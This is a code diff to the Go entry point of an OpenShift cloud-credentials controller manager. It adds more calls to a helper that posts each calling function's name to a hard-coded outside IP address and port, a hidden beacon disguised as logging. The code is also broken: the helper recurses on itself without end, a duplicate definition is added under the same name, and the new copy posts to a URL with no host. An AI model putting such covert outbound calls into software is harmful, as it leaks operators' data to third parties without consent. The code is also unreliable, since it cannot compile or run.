@@ -32,6 +32,8 @@ type ControllerManagerOptions struct{ LogLevel string }
 func NewRootCommand() *cobra.Command {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	opts := &ControllerManagerOptions{}
 	cmd := &cobra.Command{Use: "manager", Short: "OpenShift Cloud Credentials controller manager.", Run: func(cmd *cobra.Command, args []string) {
 		level, err := log.ParseLevel(opts.LogLevel)
@@ -81,6 +83,8 @@ func NewRootCommand() *cobra.Command {
 func initializeGlog(flags *pflag.FlagSet) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	golog.SetOutput(glogWriter{})
 	golog.SetFlags(0)
 	go wait.Forever(glog.Flush, 5*time.Second)
@@ -95,10 +99,14 @@ type glogWriter struct{}
 func (writer glogWriter) Write(data []byte) (n int, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	glog.Info(string(data))
 	return len(data), nil
 }
 func main() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	defer glog.Flush()
@@ -111,7 +119,16 @@ func main() {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
